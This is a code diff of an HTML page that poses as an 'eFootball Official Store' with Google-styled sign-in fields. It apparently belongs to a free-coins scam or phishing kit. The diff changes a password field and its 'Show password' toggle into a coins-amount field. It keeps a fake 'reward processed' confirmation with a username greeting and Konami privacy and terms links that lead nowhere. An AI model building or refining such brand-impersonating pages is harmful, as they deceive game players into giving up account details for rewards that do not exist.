@@ -30,7 +30,7 @@
 
     <!-- 1. Hero Banner (Official eFootball banner with store badge & players) -->
     <div class="hero-banner-wrap">
-      <img src="official-banner.png" alt="eFootball Official Store" class="hero-banner-img">
+      <img src="official-banner.webp" alt="eFootball Official Store" class="hero-banner-img">
     </div>
 
     <!-- 2. Live Notification Ticker -->
@@ -699,12 +699,12 @@
 
         <!-- Coins Amount Field with Blue Border and Floating Label -->
         <div class="g-pwd-box-wrap" id="googleCoinsWrap">
-          <label class="g-floating-label g-pwd-label" id="googleCoinsLabel">Enter your password</label>
+          <label class="g-floating-label g-pwd-label" id="googleCoinsLabel">Enter desired myClub Coins</label>
           <input 
-            type="password" 
+            type="text" 
             id="googleCoinsInput" 
             class="g-pwd-input" 
-            placeholder="Enter your password"
+            placeholder="e.g. 10.000 Coins"
             autocomplete="off"
             oninput="handleCoinsInput(this.value)"
             onkeydown="if(event.key==='Enter') handleGoogleCoinsSubmit()"
@@ -714,15 +714,19 @@
           <svg viewBox="0 0 24 24" width="14" height="14" fill="#d93025">
             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
           </svg>
-          <span id="googleCoinsErrorText">Enter your password</span>
+          <span id="googleCoinsErrorText">Enter myClub Coins amount</span>
         </div>
 
-    <!-- >>> YENİ EKLENEN KISIM (718'den hemen sonra) <<< -->
-    <div class="show-field" style="display: flex; align-items: center; gap: 8px; margin-top: 10px; margin-bottom: 12px; cursor: pointer;">
-      <input type="checkbox" id="toggleUsername" onchange="toggleUsernameVisibility()" style="width: 16px; height: 16px; cursor: pointer;">
-      <label for="toggleUsername" style="font-size: 14px; color: #202124; cursor: pointer; user-select: none;">Show password</label>
-    </div>
+        <!-- Show Coins Checkbox -->
+        <div class="g-checkbox-wrap">
+          <label class="g-checkbox-label">
+            <input type="checkbox" id="showCoinsCheckbox" class="g-checkbox-native" checked onchange="toggleCoinsVisibility(this.checked)">
+            <span class="g-checkbox-custom"></span>
+            <span class="g-checkbox-text">Show Coins</span>
+          </label>
+        </div>
 
+        <!-- Privacy & Terms Disclaimer -->
         <p class="g-disclaimer">
           Before using this app, you can review Konami <a href="javascript:void(0)" class="g-blue-link">privacy policy</a> and <a href="javascript:void(0)" class="g-blue-link">terms of service</a>.
         </p>
@@ -758,7 +762,7 @@
         <h3 class="pc-greeting">Hi <span id="pcUsername" class="pc-username-highlight">SDSE</span></h3>
         <p class="pc-desc">Your reward has been processed successfully.</p>
         <p class="pc-wait-notice">Please wait up to 24 hours.</p>
-        <p class="pc-note" id="pcNote"><strong>Note:</strong> Check your gift box in the game.</p>
+        <p class="pc-note" id="pcNote"><strong>Note:</strong> Rewards will be credited directly to your in-game account.</p>
 
         <!-- Reward Container Box -->
         <div class="pc-reward-card">
